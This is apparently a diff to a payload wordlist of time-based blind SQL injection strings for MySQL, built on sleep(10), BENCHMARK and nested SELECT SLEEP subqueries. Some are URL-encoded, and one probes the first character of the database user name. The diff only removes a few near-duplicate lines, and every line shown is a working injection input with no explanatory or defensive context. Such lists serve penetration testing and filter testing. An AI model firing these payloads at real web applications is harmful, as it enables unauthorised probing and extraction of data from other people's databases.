@@ -1,7 +1,6 @@
 'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
 "XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
 X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X
-X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X
 X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X
 'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
 (SELECT(0)FROM(SELECT(SLEEP(10)))a)
@@ -26,16 +25,12 @@ BENCHMARK(10000000,MD5(CHAR(116)))
 '%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(10),1)))a)--%20 - true
 if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"/
 if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/
-0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z
 if(now()=sysdate(),sleep(10),0)
-'XOR(if(now()=sysdate(),sleep(10),0))XOR'
 'XOR(if(now()=sysdate(),sleep(10*1),0))OR'
 0'|(IF((now())LIKE(sysdate()),SLEEP(10),0))|'Z
 (select(0)from(select(sleep(10)))v)
 '%2b(select*from(select(sleep(10)))a)%2b'
-(select*from(select(sleep(10)))a)
 1'%2b(select*from(select(sleep(10)))a)%2b'
-,(select * from (select(sleep(10)))a)
 desc%2c(select*from(select(sleep(10)))a)
 -1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(10))A))
